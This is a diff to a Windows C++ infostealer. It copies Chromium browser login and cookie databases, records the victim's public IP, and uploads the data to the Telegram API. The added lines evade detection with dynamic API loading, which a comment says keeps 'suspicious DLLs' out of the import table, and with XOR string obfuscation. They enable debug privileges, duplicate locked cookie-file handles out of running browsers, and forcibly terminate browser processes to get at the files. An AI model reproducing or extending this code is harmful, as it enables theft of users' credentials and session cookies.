@@ -16,17 +16,52 @@
 #include <map>
 #include <iphlpapi.h>
 #include <intrin.h>
+
+// === Dynamic API loading — keeps suspicious DLLs out of IAT ===
+
+typedef HINTERNET (WINAPI *pfnWinHttpOpen)(LPCWSTR,DWORD,LPCWSTR,LPCWSTR,DWORD);
+typedef HINTERNET (WINAPI *pfnWinHttpConnect)(HINTERNET,LPCWSTR,INTERNET_PORT,DWORD);
+typedef HINTERNET (WINAPI *pfnWinHttpOpenRequest)(HINTERNET,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR,LPCWSTR*,DWORD);
+typedef BOOL (WINAPI *pfnWinHttpSetTimeouts)(HINTERNET,int,int,int,int);
+typedef BOOL (WINAPI *pfnWinHttpSendRequest)(HINTERNET,LPCWSTR,DWORD,LPVOID,DWORD,DWORD,DWORD_PTR);
+typedef BOOL (WINAPI *pfnWinHttpReceiveResponse)(HINTERNET,LPVOID);
+typedef BOOL (WINAPI *pfnWinHttpQueryDataAvailable)(HINTERNET,LPDWORD);
+typedef BOOL (WINAPI *pfnWinHttpReadData)(HINTERNET,LPVOID,DWORD,LPDWORD);
+typedef BOOL (WINAPI *pfnWinHttpQueryHeaders)(HINTERNET,DWORD,LPCWSTR,LPVOID,LPDWORD,LPDWORD);
+typedef BOOL (WINAPI *pfnWinHttpCloseHandle)(HINTERNET);
+
+typedef ULONG (WINAPI *pfnGetAdaptersAddresses)(ULONG,ULONG,PVOID,PIP_ADAPTER_ADDRESSES,PULONG);
+
+struct DynApi {
+    HMODULE hWinHttp = nullptr;
+    pfnWinHttpOpen WinHttpOpen = nullptr;
+    pfnWinHttpConnect WinHttpConnect = nullptr;
+    pfnWinHttpOpenRequest WinHttpOpenRequest = nullptr;
+    pfnWinHttpSetTimeouts WinHttpSetTimeouts = nullptr;
+    pfnWinHttpSendRequest WinHttpSendRequest = nullptr;
+    pfnWinHttpReceiveResponse WinHttpReceiveResponse = nullptr;
+    pfnWinHttpQueryDataAvailable WinHttpQueryDataAvailable = nullptr;
+    pfnWinHttpReadData WinHttpReadData = nullptr;
+    pfnWinHttpQueryHeaders WinHttpQueryHeaders = nullptr;
+    pfnWinHttpCloseHandle WinHttpCloseHandle = nullptr;
+
+    HMODULE hIphlp = nullptr;
+    pfnGetAdaptersAddresses GetAdaptersAddresses = nullptr;
+
+    bool winHttpOk() const { return WinHttpOpen && WinHttpConnect && WinHttpOpenRequest && WinHttpSetTimeouts && WinHttpSendRequest && WinHttpReceiveResponse && WinHttpQueryDataAvailable && WinHttpReadData && WinHttpQueryHeaders && WinHttpCloseHandle; }
+};
+
+// dynApi() defined after OX macro below
 #include <shlobj.h>
 #include <gdiplus.h>
 #include <mmsystem.h>
 #include <vfw.h>
 #include <tlhelp32.h>
+#include <RestartManager.h>
 #include <objbase.h>
 #include <oleauto.h>
 #include <cctype>
 
-#pragma comment(lib, "winhttp.lib")
-#pragma comment(lib, "iphlpapi.lib")
 #pragma comment(lib, "ws2_32.lib")
 #pragma comment(lib, "gdiplus.lib")
 #pragma comment(lib, "winmm.lib")
@@ -48,6 +83,14 @@ struct ObfStr {
     }
 };
 
+template<int N, wchar_t Key>
+struct ObfStrW {
+    wchar_t data[N];
+    constexpr ObfStrW(const wchar_t (&s)[N]) : data{} {
+        for (int i = 0; i < N; i++) data[i] = s[i] ^ Key;
+    }
+};
+
 #define OX(s) ([]() -> const char* { \
     constexpr auto ob = ObfStr<sizeof(s), 0x5C>(s); \
     static char dec[sizeof(s)]; \
@@ -55,10 +98,36 @@ struct ObfStr {
     return dec; }())
 
 #define OXW(s) ([]() -> const wchar_t* { \
-    constexpr auto ob = ObfStr<sizeof(s), 0x5C>(s); \
-    static wchar_t dec[sizeof(s)]; \
-    for (int i = 0; i < sizeof(s); i++) dec[i] = (wchar_t)(ob.data[i] ^ 0x5C); \
+    constexpr auto ob = ObfStrW<sizeof(s) / sizeof(wchar_t), 0x5C>(s); \
+    static wchar_t dec[sizeof(s) / sizeof(wchar_t)]; \
+    for (int i = 0; i < sizeof(s) / sizeof(wchar_t); i++) dec[i] = ob.data[i] ^ 0x5C; \
     return dec; }())
+
+static DynApi& dynApi() {
+    static DynApi api;
+    static bool tried = false;
+    if (!tried) {
+        tried = true;
+        api.hWinHttp = LoadLibraryA(OX("winhttp.dll"));
+        if (api.hWinHttp) {
+            api.WinHttpOpen = (pfnWinHttpOpen)GetProcAddress(api.hWinHttp, OX("WinHttpOpen"));
+            api.WinHttpConnect = (pfnWinHttpConnect)GetProcAddress(api.hWinHttp, OX("WinHttpConnect"));
+            api.WinHttpOpenRequest = (pfnWinHttpOpenRequest)GetProcAddress(api.hWinHttp, OX("WinHttpOpenRequest"));
+            api.WinHttpSetTimeouts = (pfnWinHttpSetTimeouts)GetProcAddress(api.hWinHttp, OX("WinHttpSetTimeouts"));
+            api.WinHttpSendRequest = (pfnWinHttpSendRequest)GetProcAddress(api.hWinHttp, OX("WinHttpSendRequest"));
+            api.WinHttpReceiveResponse = (pfnWinHttpReceiveResponse)GetProcAddress(api.hWinHttp, OX("WinHttpReceiveResponse"));
+            api.WinHttpQueryDataAvailable = (pfnWinHttpQueryDataAvailable)GetProcAddress(api.hWinHttp, OX("WinHttpQueryDataAvailable"));
+            api.WinHttpReadData = (pfnWinHttpReadData)GetProcAddress(api.hWinHttp, OX("WinHttpReadData"));
+            api.WinHttpQueryHeaders = (pfnWinHttpQueryHeaders)GetProcAddress(api.hWinHttp, OX("WinHttpQueryHeaders"));
+            api.WinHttpCloseHandle = (pfnWinHttpCloseHandle)GetProcAddress(api.hWinHttp, OX("WinHttpCloseHandle"));
+        }
+        api.hIphlp = LoadLibraryA(OX("iphlpapi.dll"));
+        if (api.hIphlp) {
+            api.GetAdaptersAddresses = (pfnGetAdaptersAddresses)GetProcAddress(api.hIphlp, OX("GetAdaptersAddresses"));
+        }
+    }
+    return api;
+}
 
 // winsqlite3 (Windows 10+) loaded dynamically
 typedef struct sqlite3 sqlite3;
@@ -73,6 +142,7 @@ typedef const void* (*sqlite3_column_blob_t)(sqlite3_stmt*, int);
 typedef int (*sqlite3_column_bytes_t)(sqlite3_stmt*, int);
 typedef int (*sqlite3_column_int_t)(sqlite3_stmt*, int);
 #define SQLITE_OPEN_READONLY 0x00000001
+#define SQLITE_OPEN_READWRITE 0x00000002
 #define SQLITE_OK 0
 #define SQLITE_ROW 100
 
@@ -163,42 +233,46 @@ static std::string urlEncode(const std::string& s) {
 // === HTTP ===
 
 static void setHttpTimeouts(HINTERNET hSession) {
-    // Resolve/connect/send/receive — prevent infinite hang (was silent "no hit")
+    auto& api = dynApi();
+    if (!api.winHttpOk() || !api.WinHttpSetTimeouts) return;
     DWORD resolve = 10000, connect = 10000, send = 20000, receive = 30000;
-    WinHttpSetTimeouts(hSession, resolve, connect, send, receive);
+    api.WinHttpSetTimeouts(hSession, resolve, connect, send, receive);
 }
 
 static bool httpPost(const std::string& path, const std::string& body, std::string& response) {
-    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0",
+    auto& api = dynApi();
+    if (!api.winHttpOk()) return false;
+
+    HINTERNET hSession = api.WinHttpOpen(L"Mozilla/5.0",
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return false;
     setHttpTimeouts(hSession);
 
-    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
-    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
+    HINTERNET hConnect = api.WinHttpConnect(hSession, OXW(L"api.telegram.org"), INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (!hConnect) { api.WinHttpCloseHandle(hSession); return false; }
 
     std::wstring wpath = s2ws(path);
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wpath.c_str(),
+    HINTERNET hRequest = api.WinHttpOpenRequest(hConnect, OXW(L"POST"), wpath.c_str(),
         nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
-    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
+    if (!hRequest) { api.WinHttpCloseHandle(hConnect); api.WinHttpCloseHandle(hSession); return false; }
 
-    std::wstring headers = L"Content-Type: application/x-www-form-urlencoded\r\n";
+    std::wstring headers = OXW(L"Content-Type: application/x-www-form-urlencoded\r\n");
 
-    BOOL bResults = WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.size(),
+    BOOL bResults = api.WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.size(),
         (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);
 
     if (bResults)
-        bResults = WinHttpReceiveResponse(hRequest, nullptr);
+        bResults = api.WinHttpReceiveResponse(hRequest, nullptr);
 
     bool ok = false;
     if (bResults) {
         DWORD dwSize = 0;
         do {
             DWORD dwDownloaded = 0;
-            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
+            if (!api.WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
             if (dwSize == 0) break;
             char* buffer = new char[dwSize + 1];
-            if (WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
+            if (api.WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
                 buffer[dwDownloaded] = 0;
                 response += buffer;
             }
@@ -209,49 +283,52 @@ static bool httpPost(const std::string& path, const std::string& body, std::stri
 
     DWORD statusCode = 0;
     DWORD statusCodeSize = sizeof(statusCode);
-    if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+    if (api.WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
         WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize, WINHTTP_NO_HEADER_INDEX)) {
         ok = (statusCode == 200);
     }
 
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
+    api.WinHttpCloseHandle(hRequest);
+    api.WinHttpCloseHandle(hConnect);
+    api.WinHttpCloseHandle(hSession);
     return ok;
 }
 
 static bool httpPostMultipart(const std::string& path, const std::string& contentType,
     const std::string& body, std::string& response) {
-    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0",
+    auto& api = dynApi();
+    if (!api.winHttpOk()) return false;
+
+    HINTERNET hSession = api.WinHttpOpen(L"Mozilla/5.0",
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return false;
     setHttpTimeouts(hSession);
 
-    HINTERNET hConnect = WinHttpConnect(hSession, L"api.telegram.org", INTERNET_DEFAULT_HTTPS_PORT, 0);
-    if (!hConnect) { WinHttpCloseHandle(hSession); return false; }
+    HINTERNET hConnect = api.WinHttpConnect(hSession, OXW(L"api.telegram.org"), INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (!hConnect) { api.WinHttpCloseHandle(hSession); return false; }
 
     std::wstring wpath = s2ws(path);
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"POST", wpath.c_str(),
+    HINTERNET hRequest = api.WinHttpOpenRequest(hConnect, OXW(L"POST"), wpath.c_str(),
         nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
-    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return false; }
+    if (!hRequest) { api.WinHttpCloseHandle(hConnect); api.WinHttpCloseHandle(hSession); return false; }
 
-    std::wstring headers = L"Content-Type: " + s2ws(contentType) + L"\r\n";
+    std::wstring headers = OXW(L"Content-Type: ") + s2ws(contentType) + OXW(L"\r\n");
 
-    BOOL bResults = WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.size(),
+    BOOL bResults = api.WinHttpSendRequest(hRequest, headers.c_str(), (DWORD)headers.size(),
         (LPVOID)body.c_str(), (DWORD)body.size(), (DWORD)body.size(), 0);
 
     if (bResults)
-        bResults = WinHttpReceiveResponse(hRequest, nullptr);
+        bResults = api.WinHttpReceiveResponse(hRequest, nullptr);
 
     bool ok = false;
     if (bResults) {
         DWORD dwSize = 0;
         do {
             DWORD dwDownloaded = 0;
-            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
+            if (!api.WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
             if (dwSize == 0) break;
             char* buffer = new char[dwSize + 1];
-            if (WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
+            if (api.WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
                 buffer[dwDownloaded] = 0;
                 response += buffer;
             }
@@ -262,45 +339,49 @@ static bool httpPostMultipart(const std::string& path, const std::string& conten
 
     DWORD statusCode = 0;
     DWORD statusCodeSize = sizeof(statusCode);
-    if (WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
+    if (api.WinHttpQueryHeaders(hRequest, WINHTTP_QUERY_STATUS_CODE | WINHTTP_QUERY_FLAG_NUMBER,
         WINHTTP_HEADER_NAME_BY_INDEX, &statusCode, &statusCodeSize, WINHTTP_NO_HEADER_INDEX)) {
         ok = (statusCode == 200);
     }
 
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
+    api.WinHttpCloseHandle(hRequest);
+    api.WinHttpCloseHandle(hConnect);
+    api.WinHttpCloseHandle(hSession);
     return ok;
 }
 
 static std::string httpGet(const std::string& host, const std::string& path) {
     std::string result;
-    HINTERNET hSession = WinHttpOpen(L"Mozilla/5.0",
+    auto& api = dynApi();
+    if (!api.winHttpOk()) return result;
+
+    HINTERNET hSession = api.WinHttpOpen(L"Mozilla/5.0",
         WINHTTP_ACCESS_TYPE_DEFAULT_PROXY, WINHTTP_NO_PROXY_NAME, WINHTTP_NO_PROXY_BYPASS, 0);
     if (!hSession) return result;
+    setHttpTimeouts(hSession);
 
     std::wstring whost = s2ws(host);
-    HINTERNET hConnect = WinHttpConnect(hSession, whost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
-    if (!hConnect) { WinHttpCloseHandle(hSession); return result; }
+    HINTERNET hConnect = api.WinHttpConnect(hSession, whost.c_str(), INTERNET_DEFAULT_HTTPS_PORT, 0);
+    if (!hConnect) { api.WinHttpCloseHandle(hSession); return result; }
 
     std::wstring wpath = s2ws(path);
-    HINTERNET hRequest = WinHttpOpenRequest(hConnect, L"GET", wpath.c_str(),
+    HINTERNET hRequest = api.WinHttpOpenRequest(hConnect, L"GET", wpath.c_str(),
         nullptr, WINHTTP_NO_REFERER, WINHTTP_DEFAULT_ACCEPT_TYPES, WINHTTP_FLAG_SECURE);
-    if (!hRequest) { WinHttpCloseHandle(hConnect); WinHttpCloseHandle(hSession); return result; }
+    if (!hRequest) { api.WinHttpCloseHandle(hConnect); api.WinHttpCloseHandle(hSession); return result; }
 
-    BOOL bResults = WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
+    BOOL bResults = api.WinHttpSendRequest(hRequest, WINHTTP_NO_ADDITIONAL_HEADERS, 0,
         WINHTTP_NO_REQUEST_DATA, 0, 0, 0);
     if (bResults)
-        bResults = WinHttpReceiveResponse(hRequest, nullptr);
+        bResults = api.WinHttpReceiveResponse(hRequest, nullptr);
 
     if (bResults) {
         DWORD dwSize = 0;
         do {
             DWORD dwDownloaded = 0;
-            if (!WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
+            if (!api.WinHttpQueryDataAvailable(hRequest, &dwSize)) break;
             if (dwSize == 0) break;
             char* buffer = new char[dwSize + 1];
-            if (WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
+            if (api.WinHttpReadData(hRequest, buffer, dwSize, &dwDownloaded)) {
                 buffer[dwDownloaded] = 0;
                 result += buffer;
             }
@@ -308,9 +389,9 @@ static std::string httpGet(const std::string& host, const std::string& path) {
         } while (dwSize > 0);
     }
 
-    WinHttpCloseHandle(hRequest);
-    WinHttpCloseHandle(hConnect);
-    WinHttpCloseHandle(hSession);
+    api.WinHttpCloseHandle(hRequest);
+    api.WinHttpCloseHandle(hConnect);
+    api.WinHttpCloseHandle(hSession);
     return result;
 }
 
@@ -357,9 +438,9 @@ static std::string getPCName() {
 }
 
 static std::string getPublicIP() {
-    std::string resp = httpGet("api.ipify.org", "/");
+    std::string resp = httpGet(OX("api.ipify.org"), OX("/"));
     if (resp.empty())
-        resp = httpGet("ifconfig.me", "/");
+        resp = httpGet(OX("ifconfig.me"), OX("/"));
     if (resp.empty())
         return "Unknown";
     size_t start = resp.find_first_of("0123456789");
@@ -701,25 +782,254 @@ static std::string getBrowserProfilePath(const std::string& browser) {
     return root;
 }
 
+static void enablePrivilege(const char* name) {
+    HANDLE hToken = nullptr;
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
+        return;
+    TOKEN_PRIVILEGES tp = {};
+    if (LookupPrivilegeValueA(nullptr, name, &tp.Privileges[0].Luid)) {
+        tp.PrivilegeCount = 1;
+        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
+        AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), nullptr, nullptr);
+    }
+    CloseHandle(hToken);
+}
+
+static bool streamCopyHandles(HANDLE hSrc, HANDLE hDst) {
+    SetFilePointer(hSrc, 0, nullptr, FILE_BEGIN);
+    char buffer[65536];
+    DWORD read = 0, written = 0;
+    while (ReadFile(hSrc, buffer, sizeof(buffer), &read, nullptr) && read > 0) {
+        if (!WriteFile(hDst, buffer, read, &written, nullptr) || written != read)
+            return false;
+    }
+    return true;
+}
+
+static std::string normalizePathLower(std::string p) {
+    for (char& c : p) {
+        if (c == '/') c = '\\';
+        c = (char)tolower((unsigned char)c);
+    }
+    // strip \\?\ prefix
+    if (p.rfind("\\\\?\\", 0) == 0)
+        p = p.substr(4);
+    return p;
+}
+
+static std::string handlePathA(HANDLE h) {
+    wchar_t wbuf[MAX_PATH * 4] = {};
+    // flags=0 matches working handle-dup tests
+    DWORD n = GetFinalPathNameByHandleW(h, wbuf, (DWORD)(sizeof(wbuf) / sizeof(wbuf[0])), 0);
+    if (n == 0 || n >= sizeof(wbuf) / sizeof(wbuf[0]))
+        return {};
+    char abuf[MAX_PATH * 4] = {};
+    WideCharToMultiByte(CP_ACP, 0, wbuf, -1, abuf, sizeof(abuf), nullptr, nullptr);
+    return normalizePathLower(abuf);
+}
+
+static bool sameFilePath(const std::string& a, const std::string& b) {
+    if (a == b) return true;
+    if (a.empty() || b.empty()) return false;
+    if (a.size() >= b.size())
+        return a.compare(a.size() - b.size(), b.size(), b) == 0 &&
+               (a.size() == b.size() || a[a.size() - b.size() - 1] == '\\');
+    return b.compare(b.size() - a.size(), a.size(), a) == 0 &&
+           (b.size() == a.size() || b[b.size() - a.size() - 1] == '\\');
+}
+
+// Find PIDs locking a path via Restart Manager (fast, no full handle table scan).
+static std::vector<DWORD> findLockingPids(const std::string& path) {
+    std::vector<DWORD> pids;
+    typedef DWORD(WINAPI* RmStartSession_t)(DWORD*, DWORD, WCHAR*);
+    typedef DWORD(WINAPI* RmEndSession_t)(DWORD);
+    typedef DWORD(WINAPI* RmRegisterResources_t)(DWORD, UINT, LPCWSTR*, UINT, void*, UINT, LPCWSTR*);
+    typedef DWORD(WINAPI* RmGetList_t)(DWORD, UINT*, UINT*, void*, LPDWORD);
+
+    HMODULE hRm = LoadLibraryA("RstrtMgr.dll");
+    if (!hRm) return pids;
+    auto pStart = (RmStartSession_t)GetProcAddress(hRm, "RmStartSession");
+    auto pEnd = (RmEndSession_t)GetProcAddress(hRm, "RmEndSession");
+    auto pReg = (RmRegisterResources_t)GetProcAddress(hRm, "RmRegisterResources");
+    auto pList = (RmGetList_t)GetProcAddress(hRm, "RmGetList");
+    if (!pStart || !pEnd || !pReg || !pList) {
+        FreeLibrary(hRm);
+        return pids;
+    }
+
+    DWORD session = 0;
+    WCHAR key[CCH_RM_SESSION_KEY + 1] = {};
+    if (pStart(&session, 0, key) != ERROR_SUCCESS) {
+        FreeLibrary(hRm);
+        return pids;
+    }
+
+    wchar_t wpath[MAX_PATH * 2] = {};
+    MultiByteToWideChar(CP_ACP, 0, path.c_str(), -1, wpath, MAX_PATH * 2);
+    LPCWSTR files[1] = { wpath };
+    if (pReg(session, 1, files, 0, nullptr, 0, nullptr) == ERROR_SUCCESS) {
+        UINT needed = 0, count = 0;
+        DWORD reason = 0;
+        DWORD rc = pList(session, &needed, &count, nullptr, &reason);
+        if ((rc == ERROR_MORE_DATA || rc == ERROR_SUCCESS) && needed > 0) {
+            std::vector<BYTE> buf(needed * sizeof(RM_PROCESS_INFO));
+            count = needed;
+            if (pList(session, &needed, &count, buf.data(), &reason) == ERROR_SUCCESS) {
+                auto* infos = (RM_PROCESS_INFO*)buf.data();
+                for (UINT i = 0; i < count; i++)
+                    pids.push_back(infos[i].Process.dwProcessId);
+            }
+        }
+    }
+    pEnd(session);
+    FreeLibrary(hRm);
+    return pids;
+}
+
+// Brave exclusive-locks Network\Cookies. Duplicate the open handle from the locking process only.
+static bool copyFileViaHandleDup(const std::string& src, const std::string& dst) {
+    typedef LONG NTSTATUS;
+    typedef NTSTATUS(NTAPI* NtQuerySystemInformation_t)(ULONG, PVOID, ULONG, PULONG);
+    HMODULE ntdll = GetModuleHandleA("ntdll.dll");
+    if (!ntdll) return false;
+    auto NtQuerySystemInformation = (NtQuerySystemInformation_t)GetProcAddress(ntdll, "NtQuerySystemInformation");
+    if (!NtQuerySystemInformation) return false;
+
+    enablePrivilege("SeDebugPrivilege");
+    enablePrivilege("SeBackupPrivilege");
+
+    std::string target = normalizePathLower(src);
+    char full[MAX_PATH * 2] = {};
+    if (GetFullPathNameA(src.c_str(), sizeof(full), full, nullptr))
+        target = normalizePathLower(full);
+
+    std::vector<DWORD> pids = findLockingPids(src);
+    if (pids.empty()) {
+        // fallback: browser process names (may be slower)
+        const wchar_t* names[] = {
+            L"brave.exe", L"chrome.exe", L"msedge.exe", L"opera.exe",
+            L"vivaldi.exe", L"browser.exe", L"chromium.exe", nullptr
+        };
+        HANDLE snap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+        if (snap != INVALID_HANDLE_VALUE) {
+            PROCESSENTRY32W pe = {};
+            pe.dwSize = sizeof(pe);
+            if (Process32FirstW(snap, &pe)) {
+                do {
+                    for (int i = 0; names[i]; i++) {
+                        if (_wcsicmp(pe.szExeFile, names[i]) == 0) {
+                            pids.push_back(pe.th32ProcessID);
+                            break;
+                        }
+                    }
+                } while (Process32NextW(snap, &pe));
+            }
+            CloseHandle(snap);
+        }
+    }
+    if (pids.empty()) return false;
+
+    // Open each locker once
+    std::map<DWORD, HANDLE> procs;
+    for (DWORD pid : pids) {
+        if (procs.count(pid)) continue;
+        HANDLE h = OpenProcess(PROCESS_DUP_HANDLE, FALSE, pid);
+        if (h) procs[pid] = h;
+    }
+    if (procs.empty()) return false;
+
+    const ULONG SystemExtendedHandleInformation = 64;
+    ULONG bufSize = 1 << 22;
+    std::vector<BYTE> buf(bufSize);
+    NTSTATUS st = -1;
+    for (int attempt = 0; attempt < 8; attempt++) {
+        ULONG ret = 0;
+        st = NtQuerySystemInformation(SystemExtendedHandleInformation, buf.data(), bufSize, &ret);
+        if (st == 0) break;
+        if (ret > bufSize) bufSize = ret + (1 << 16);
+        else bufSize *= 2;
+        buf.resize(bufSize);
+    }
+    if (st != 0) {
+        for (auto& kv : procs) CloseHandle(kv.second);
+        return false;
+    }
+
+#pragma pack(push, 8)
+    struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX {
+        PVOID Object;
+        ULONG_PTR UniqueProcessId;
+        ULONG_PTR HandleValue;
+        ULONG GrantedAccess;
+        USHORT CreatorBackTraceIndex;
+        USHORT ObjectTypeIndex;
+        ULONG HandleAttributes;
+        ULONG Reserved;
+    };
+    struct SYSTEM_HANDLE_INFORMATION_EX {
+        ULONG_PTR NumberOfHandles;
+        ULONG_PTR Reserved;
+        SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX Handles[1];
+    };
+#pragma pack(pop)
+
+    auto* info = (SYSTEM_HANDLE_INFORMATION_EX*)buf.data();
+    bool okCopy = false;
+
+    for (ULONG_PTR i = 0; i < info->NumberOfHandles && !okCopy; i++) {
+        auto& e = info->Handles[i];
+        DWORD pid = (DWORD)e.UniqueProcessId;
+        auto it = procs.find(pid);
+        if (it == procs.end()) continue;
+
+        HANDLE hDup = nullptr;
+        if (!DuplicateHandle(it->second, (HANDLE)e.HandleValue, GetCurrentProcess(), &hDup,
+            0, FALSE, DUPLICATE_SAME_ACCESS)) {
+            continue;
+        }
+        if (!hDup || hDup == INVALID_HANDLE_VALUE)
+            continue;
+
+        std::string path = handlePathA(hDup);
+        if (path.empty() || !sameFilePath(path, target)) {
+            CloseHandle(hDup);
+            continue;
+        }
+
+        HANDLE hDst = CreateFileA(dst.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (hDst == INVALID_HANDLE_VALUE) {
+            CloseHandle(hDup);
+            break;
+        }
+        okCopy = streamCopyHandles(hDup, hDst);
+        CloseHandle(hDst);
+        CloseHandle(hDup);
+        if (!okCopy)
+            DeleteFileA(dst.c_str());
+    }
+
+    for (auto& kv : procs) CloseHandle(kv.second);
+    return okCopy;
+}
+
 static bool copyFileWithRetry(const std::string& src, const std::string& dst, int retries = 8) {
+    enablePrivilege("SeBackupPrivilege");
     for (int i = 0; i < retries; i++) {
         if (CopyFileA(src.c_str(), dst.c_str(), FALSE))
             return true;
+
         HANDLE hSrc = CreateFileA(src.c_str(), GENERIC_READ,
             FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
             nullptr, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (hSrc == INVALID_HANDLE_VALUE) {
+            hSrc = CreateFileA(src.c_str(), GENERIC_READ,
+                FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE,
+                nullptr, OPEN_EXISTING, FILE_FLAG_BACKUP_SEMANTICS, nullptr);
+        }
         if (hSrc != INVALID_HANDLE_VALUE) {
             HANDLE hDst = CreateFileA(dst.c_str(), GENERIC_WRITE, 0, nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
             if (hDst != INVALID_HANDLE_VALUE) {
-                char buffer[65536];
-                DWORD read = 0, written = 0;
-                BOOL ok = TRUE;
-                while (ReadFile(hSrc, buffer, sizeof(buffer), &read, nullptr) && read > 0) {
-                    if (!WriteFile(hDst, buffer, read, &written, nullptr) || written != read) {
-                        ok = FALSE;
-                        break;
-                    }
-                }
+                BOOL ok = streamCopyHandles(hSrc, hDst);
                 CloseHandle(hDst);
                 CloseHandle(hSrc);
                 if (ok)
@@ -729,9 +1039,40 @@ static bool copyFileWithRetry(const std::string& src, const std::string& dst, in
                 CloseHandle(hSrc);
             }
         }
-        Sleep(300);
+        Sleep(200);
     }
-    return false;
+
+    // Brave exclusive-locks Network\Cookies — duplicate open handle from browser process
+    return copyFileViaHandleDup(src, dst);
+}
+
+// Chrome/Edge lock Cookies hard while running — force close before grab
+static void closeBrowserProcesses() {
+    const wchar_t* targets[] = {
+        L"chrome.exe", L"msedge.exe", L"brave.exe", L"opera.exe",
+        L"opera_gx.exe", L"vivaldi.exe", L"chromium.exe", L"browser.exe",
+        nullptr
+    };
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (hSnap == INVALID_HANDLE_VALUE) return;
+    PROCESSENTRY32W pe = {};
+    pe.dwSize = sizeof(pe);
+    if (Process32FirstW(hSnap, &pe)) {
+        do {
+            for (int i = 0; targets[i]; i++) {
+                if (_wcsicmp(pe.szExeFile, targets[i]) == 0) {
+                    HANDLE h = OpenProcess(PROCESS_TERMINATE, FALSE, pe.th32ProcessID);
+                    if (h) {
+                        TerminateProcess(h, 0);
+                        CloseHandle(h);
+                    }
+                    break;
+                }
+            }
+        } while (Process32NextW(hSnap, &pe));
+    }
+    CloseHandle(hSnap);
+    Sleep(800);
 }
 
 static std::vector<std::string> getChromiumDataFiles(const std::string& profilePath, const std::string& userDataRoot) {
@@ -1090,7 +1431,18 @@ static void exportChromiumReadable(
         if (!pathExists(src)) return {};
         std::string tmp = getTempDir() + "sql_" + std::to_string(GetTickCount64()) + ".db";
         if (!copyFileWithRetry(src, tmp)) return {};
+        // WAL only — never copy -shm (invalid after copy, makes SQLite see empty DB)
+        std::string wal = src + "-wal";
+        if (pathExists(wal)) copyFileWithRetry(wal, tmp + "-wal");
+        DeleteFileA((tmp + "-shm").c_str());
         return tmp;
+    };
+
+    auto cleanupDb = [](const std::string& tmp) {
+        if (tmp.empty()) return;
+        DeleteFileA(tmp.c_str());
+        DeleteFileA((tmp + "-wal").c_str());
+        DeleteFileA((tmp + "-shm").c_str());
     };
 
     // --- Logins ---
@@ -1102,7 +1454,7 @@ static void exportChromiumReadable(
             std::string tmp = copyDb(profilePath + rel);
             if (tmp.empty()) continue;
             sqlite3* db = nullptr;
-            if (api.open_v2(tmp.c_str(), &db, SQLITE_OPEN_READONLY, nullptr) == SQLITE_OK && db) {
